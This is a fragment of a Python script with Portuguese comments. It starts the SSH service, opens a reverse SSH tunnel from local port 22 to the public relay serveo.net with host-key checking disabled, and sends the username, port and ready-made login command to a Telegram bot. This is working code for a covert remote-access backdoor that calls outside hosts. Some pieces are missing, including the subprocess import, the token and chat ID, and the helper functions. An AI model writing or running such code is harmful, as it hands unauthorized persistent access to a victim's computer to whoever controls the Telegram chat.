import os
import requests
import time, random
import socket
# ... (restante do código anterior)

def main():
    # 1. (Lógica de verificação/início do SSH que já funcionou)
    if not is_ssh_running():
        start_ssh_service()
        time.sleep(2)
        if not is_ssh_running():
            print("❌ Falha ao iniciar porta 22.")
            return

    # 2. Configuração do Túnel
    porta_remota = random.randint(2000, 9000)
    usuario = os.getlogin() # Captura o usuário logado
    
    # Se rodar com sudo, às vezes os.getlogin() falha, então usamos uma alternativa:
    if usuario == "root":
        usuario = os.getenv("SUDO_USER", "root")

    print(f"✅ Porta 22 ativa! Abrindo túnel na porta {porta_remota}...")
    
    cmd = ["ssh", "-o", "StrictHostKeyChecking=no", "-R", f"{porta_remota}:localhost:22", "serveo.net"]
    
    try:
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        time.sleep(8) # Aguarda o túnel estabilizar
        
        if process.poll() is None:
            # A MENSAGEM QUE VOCÊ QUER:
            mensagem = (
                f"✅ **ACESSO REMOTO CONFIGURADO**\n\n"
                f"👤 Usuário: `{usuario}`\n"
                f"🔌 Porta: `{porta_remota}`\n"
                f"🔗 Comando:\n`ssh {usuario}@serveo.net -p {porta_remota}`"
            )
            
            # Envio para o Telegram
            url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
            requests.post(url, json={
                "chat_id": CHAT_ID, 
                "text": mensagem, 
                "parse_mode": "Markdown"
            })
            
            print("🚀 TUDO OK! Verifique o Telegram.")
            process.wait()
    except Exception as e:
        print(f"Erro: {e}")

if __name__ == "__main__":
    main()